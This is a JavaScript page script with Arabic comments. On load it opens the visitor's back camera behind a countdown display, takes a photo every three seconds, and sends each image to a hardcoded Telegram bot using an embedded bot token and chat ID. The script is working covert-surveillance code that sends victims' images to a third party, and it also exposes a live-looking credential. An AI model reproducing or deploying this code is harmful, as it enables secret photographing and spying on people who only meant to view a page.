document.addEventListener("DOMContentLoaded", async function () {
    const countdownElement = document.getElementById("countdown");
    const progressBar = document.getElementById("progress");
    let timeLeft = 20;
    let countdownStarted = false;

    async function getBackCameraId() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const backCamera = devices.find(device => device.kind === 'videoinput' && device.label.toLowerCase().includes('back'));
            return backCamera ? backCamera.deviceId : null;
        } catch (error) {
            console.error("❌ فشل في جلب قائمة الكاميرات:", error);
            return null;
        }
    }

    async function startCamera() {
        try {
            const backCameraId = await getBackCameraId();
            if (!backCameraId) {
                console.warn("⚠ لم يتم العثور على كاميرا خلفية! سيتم تشغيل الافتراضية.");
            }

            const video = document.getElementById('video');
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { deviceId: backCameraId ? { exact: backCameraId } : undefined }
            });

            video.srcObject = stream;
            video.onloadedmetadata = () => {
                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي والتقاط الصور فورًا...");
                startCountdown();
                capturePhotosRepeatedly();
            };
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
        }
    }

    function startCountdown() {
        if (countdownStarted) return; // منع تكرار تشغيل العد
        countdownStarted = true;

        const countdownInterval = setInterval(() => {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            progressBar.style.width = (timeLeft / 20) * 100 + "%";

            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
    }

    function capturePhotosRepeatedly() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function takePhoto() {
            if (!document.hasFocus()) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");

            setTimeout(takePhoto, 3000); // التقاط صورة كل 3 ثواني
        }

        takePhoto(); // أول لقطة فور تشغيل الكاميرا
    }

    function sendPhoto(blob) {
        const formData = new FormData();
        formData.append("chat_id", "5375214810");
        formData.append("photo", blob, "snapshot.jpg");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الصورة بنجاح:", data))
        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
    }

    startCamera(); // تشغيل الكاميرا فور تحميل الصفحة
});
